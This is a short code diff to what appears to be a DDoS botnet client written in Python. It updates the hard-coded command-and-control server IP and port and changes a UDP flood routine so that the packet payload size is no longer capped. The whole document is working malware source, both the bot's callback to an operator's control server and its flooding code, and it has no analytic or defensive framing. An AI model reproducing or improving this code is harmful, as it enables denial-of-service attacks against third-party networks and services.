@@ -20,7 +20,7 @@ import random
 import threading
 import base64 as b64
 #config
-cnc                  = "84.90.240.116"#your cnc ip
+cnc                  = "34.105.234.222"#your cnc ip
 cport                = 1337#your cnc port
 scan_ip              = "127.0.0.1"#Recevie the scanned ip
 scan_port            = 911#same
@@ -163,7 +163,7 @@ def UDP(ip, port, size):#udp flood(best size is 512-1024, if size too big router
 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 		try:
 			for _ in range(200):
-				udpbytes = random._urandom(min(65500, size))
+				udpbytes = random._urandom(int(size))
 				s.sendto(udpbytes, sendip)
 			s.close()
 		except:
